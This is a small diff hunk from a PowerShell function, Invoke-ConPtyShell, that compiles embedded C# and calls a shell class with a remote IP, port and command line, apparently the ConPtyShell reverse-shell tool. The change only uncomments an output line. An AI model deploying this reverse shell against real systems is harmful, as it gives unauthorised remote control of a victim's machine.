@@ -112,7 +112,7 @@ function Invoke-ConPtyShell
     $parametersConPtyShell = @($RemoteIp, $RemotePort, $Rows, $Cols, $CommandLine)
     Add-Type -TypeDefinition $Source -Language CSharp;
     $output = [ConPtyShellMainClass]::ConPtyShellMain($parametersConPtyShell)
-    //Write-Output $output
+    Write-Output $output
 }
 
 $Source = @"
